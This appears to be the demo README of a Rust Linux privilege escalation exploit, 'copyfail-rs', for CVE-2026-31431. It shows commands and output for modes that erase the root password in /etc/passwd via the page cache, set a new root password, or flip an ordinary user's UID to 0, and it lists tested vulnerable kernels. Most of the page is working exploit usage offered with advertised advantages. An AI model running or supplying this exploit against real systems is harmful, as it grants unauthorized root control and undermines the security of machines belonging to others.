# 演示 / Demo

## --check 安全预检

```bash
./copyfail-rs --check
```

```text
Safe preflight/check mode: no overwrite or exec attempted.
Resolved su path: /usr/bin/su
Path type: regular file
Metadata mode: 4755
setuid bit: yes
uid: 0 gid: 0
size: 55680 bytes
read-only open as current user: yes
```

## --escalate 提权

```bash
./copyfail-rs --escalate
```

```text
[*] CVE-2026-31431 — Copy Fail
[*] Mode: remove root password via /etc/passwd

[*] Backup: /tmp/.passwd.bak
[*] Before: root:x:0:0:root:/root:/bin/bash
[*] After:  root::0:0:root :/root:/bin/bash
[*] Offset: 0

    [0x000000]  726f6f74  root
    [0x000004]  3a3a303a  ::0:
    [0x000008]  303a726f  0:ro
    [0x00000c]  6f74203a  ot :
    [0x000010]  2f726f6f  /roo
    [0x000014]  743a2f62  t:/b
    [0x000018]  696e2f62  in/b
    [0x00001c]  6173680a  ash.

[+] Success: root::0:0:root :/root:/bin/bash

[*] Recovery: echo 3 > /proc/sys/vm/drop_caches
[*] Running: su root (no password needed)
```

验证 / Verify：

```bash
su -c 'id && whoami' root
# uid=0(root) gid=0(root) groups=0(root)
# root
```

## --set-password 设置密码

```bash
printf '%s\n' 'new-root-password' | ./copyfail-rs --set-password
```

```text
[*] CVE-2026-31431 — Copy Fail
[*] Mode: remove root password via /etc/passwd
...
[+] Success: root::0:0:root :/root:/bin/bash

[*] Setting root password via chpasswd...
[+] Root password set successfully.
[*] Recovery: echo 3 > /proc/sys/vm/drop_caches
```

验证 / Verify：

```bash
echo 'new-root-password' | su -c 'id && whoami' root
# uid=0(root) gid=0(root) groups=0(root)
# root
```

## --uid 翻转 UID

```bash
./copyfail-rs --uid
```

```text
[*] CVE-2026-31431 — Copy Fail (UID flip)
[*] user=<username> uid=1000

[*] /etc/passwd: <username> UID field at offset 46 = "1000"
[*] Patching "1000" -> "0000" in page cache...
[*] Page cache now reads "0000" at offset 46

[+] /etc/passwd page cache now lists <username> as UID 0.
[+] Run:   su <username>
[*] Page cache will be recovered before the root shell starts.
```

验证 / Verify：

```bash
su <username>  # 输入自己的密码
# uid=0(root) gid=0(root) groups=0(root)
```

优势 / Advantages：
- 不需要修改 root 密码
- 用自己的密码即可提权
- 适用于任何 4 位 UID (1000-9999) 的用户

## 恢复 / Recovery

```bash
echo 3 > /proc/sys/vm/drop_caches
```

## 测试环境 / Tested On

| 系统 | 内核 | 结果 |
|---|---|---|
| Ubuntu 22.04.2 LTS | 6.8.0-87-generic | --escalate ✓, --set-password ✓, --uid ✓ |
| Ubuntu 22.04.2 LTS | 6.8.0-107-generic | --escalate ✓, --uid ✓ |
| Ubuntu 25.10 | 6.17.0-5-generic | splice EINVAL，内核已修补 |
| Ubuntu 25.10 | 6.17.0-8-generic | --uid ✓ |
| Alpine Linux edge | 6.19.12 | 运行正常，写入被内核修复阻止 |
